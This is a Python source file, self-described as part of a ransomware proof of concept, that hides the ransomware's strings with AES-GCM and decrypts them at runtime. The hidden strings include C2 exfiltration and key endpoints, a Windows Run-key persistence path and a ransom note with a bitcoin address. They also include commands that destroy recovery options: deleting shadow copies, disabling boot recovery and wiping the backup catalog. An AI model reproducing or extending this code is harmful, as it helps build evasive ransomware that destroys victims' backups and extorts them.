#!/usr/bin/env python3
"""
String encryption/decryption module for ransomware PoC.
Encrypts sensitive strings at rest and decrypts at runtime.
Uses AES-256-GCM for authenticated encryption.
"""

import base64
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from typing import Optional


class StringEncryptor:
    """
    Runtime string encryption/decryption.
    Strings are encrypted with a hardcoded key and decrypted at runtime.
    """

    def __init__(self, key: Optional[bytes] = None):
        """
        Initialize with encryption key. If None, generates from environment.
        """
        # In real malware, this key would be obfuscated/hardcoded
        if key is None:
            # Generate from a deterministic seed or hardcoded
            self.key = self._derive_key(b"PainPainObfuscationKey_v1.0_X7k9mP2qR4sT6uV8wX9yZ0aB1cD2eF3")
        else:
            self.key = key

    def _derive_key(self, seed: bytes) -> bytes:
        """Derive a 32-byte key from seed."""
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2

        kdf = PBKDF2(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b"PainPainSalt_v1",  # In real malware, salt would be obfuscated
            iterations=100000,
        )
        return kdf.derive(seed)

    def encrypt_string(self, plaintext: str) -> str:
        """
        Encrypt a string and return base64-encoded ciphertext.
        Format: nonce (12 bytes) + tag (16 bytes) + ciphertext
        """
        nonce = os.urandom(12)
        aesgcm = Cipher(
            algorithms.AES(self.key),
            modes.GCM(nonce),
            backend=default_backend()
        ).encryptor()

        ciphertext = aesgcm.update(plaintext.encode('utf-8')) + aesgcm.finalize()
        tag = aesgcm.tag

        # Combine: nonce + tag + ciphertext
        combined = nonce + tag + ciphertext
        return base64.b64encode(combined).decode('utf-8')

    def decrypt_string(self, encrypted: str) -> str:
        """
        Decrypt a base64-encoded encrypted string.
        """
        try:
            combined = base64.b64decode(encrypted)
            nonce = combined[:12]
            tag = combined[12:28]
            ciphertext = combined[28:]

            aesgcm = Cipher(
                algorithms.AES(self.key),
                modes.GCM(nonce, tag),
                backend=default_backend()
            ).decryptor()

            plaintext = aesgcm.update(ciphertext) + aesgcm.finalize()
            return plaintext.decode('utf-8')
        except Exception as e:
            return f"[DECRYPTION_FAILED: {e}]"


class EncryptedStrings:
    """
    Container for encrypted strings used throughout the ransomware.
    Access via properties that decrypt on-the-fly.
    """

    def __init__(self):
        self._encryptor = StringEncryptor()
        self._encrypted_registry = {}

        # Pre-encrypt common strings
        self._init_strings()

    def _init_strings(self):
        """Initialize encrypted string registry."""
        strings = {
            'c2_endpoint': '/exfiltrate',
            'c2_pubkey_endpoint': '/public_key',
            'c2_fetch_key_endpoint': '/fetch_key',
            'file_extension': '.wasted',
            'registry_run_path': r'Software\Microsoft\Windows\CurrentVersion\Run',
            'powershell': 'powershell.exe',
            'cmd': 'cmd.exe',
            'vssadmin': 'vssadmin.exe delete shadows /all /quiet',
            'bcdedit': 'bcdedit /set {default} recoveryenabled No',
            'wbadmin': 'wbadmin delete catalog -quiet',
            'wmic_shadow': 'wmic shadowcopy delete',
            'tor_browser': 'tor.exe',
            'ransom_note_title': 'Ooops, your files have been encrypted!',
            'bitcoin_address': '1BitcoinEaterAddressDontSendf59kuE',
            'payment_amount': '0.15 BTC',
            'support_email': 'support@decrypt-server.onion',
        }

        for key, value in strings.items():
            self._encrypted_registry[key] = self._encryptor.encrypt_string(value)

    def get(self, key: str) -> str:
        """Get decrypted string by key."""
        if key in self._encrypted_registry:
            return self._encryptor.decrypt_string(self._encrypted_registry[key])
        return f"[MISSING:{key}]"

    # Properties for common strings
    @property
    def c2_endpoint(self) -> str:
        return self.get('c2_endpoint')

    @property
    def c2_pubkey_endpoint(self) -> str:
        return self.get('c2_pubkey_endpoint')

    @property
    def c2_fetch_key_endpoint(self) -> str:
        return self.get('c2_fetch_key_endpoint')

    @property
    def file_extension(self) -> str:
        return self.get('file_extension')

    @property
    def registry_run_path(self) -> str:
        return self.get('registry_run_path')

    @property
    def powershell(self) -> str:
        return self.get('powershell')

    @property
    def cmd(self) -> str:
        return self.get('cmd')

    @property
    def vssadmin_cmd(self) -> str:
        return self.get('vssadmin')

    @property
    def bcdedit_cmd(self) -> str:
        return self.get('bcdedit')

    @property
    def wbadmin_cmd(self) -> str:
        return self.get('wbadmin')

    @property
    def wmic_shadow_cmd(self) -> str:
        return self.get('wmic_shadow')

    @property
    def tor_browser(self) -> str:
        return self.get('tor_browser')

    @property
    def ransom_note_title(self) -> str:
        return self.get('ransom_note_title')

    @property
    def bitcoin_address(self) -> str:
        return self.get('bitcoin_address')

    @property
    def payment_amount(self) -> str:
        return self.get('payment_amount')

    @property
    def support_email(self) -> str:
        return self.get('support_email')


# Singleton instance
_encrypted_strings = None

def get_encrypted_strings() -> EncryptedStrings:
    """Get singleton EncryptedStrings instance."""
    global _encrypted_strings
    if _encrypted_strings is None:
        _encrypted_strings = EncryptedStrings()
    return _encrypted_strings


def encrypt_for_build(plaintext: str) -> str:
    """
    Utility function to encrypt strings at build time.
    Output can be hardcoded into source.
    """
    encryptor = StringEncryptor()
    return encryptor.encrypt_string(plaintext)


if __name__ == "__main__":
    # Build-time utility: encrypt strings for hardcoding
    print("String Encryption Build Tool")
    print("=" * 50)

    encryptor = StringEncryptor()

    test_strings = [
        "https://c2-server.onion/exfiltrate",
        "cmd.exe /c whoami",
        " ransom_note_title ",
    ]

    for s in test_strings:
        encrypted = encryptor.encrypt_string(s)
        decrypted = encryptor.decrypt_string(encrypted)
        print(f"\nOriginal: {s}")
        print(f"Encrypted: {encrypted}")
        print(f"Decrypted: {decrypted}")
        print(f"Match: {s == decrypted}")
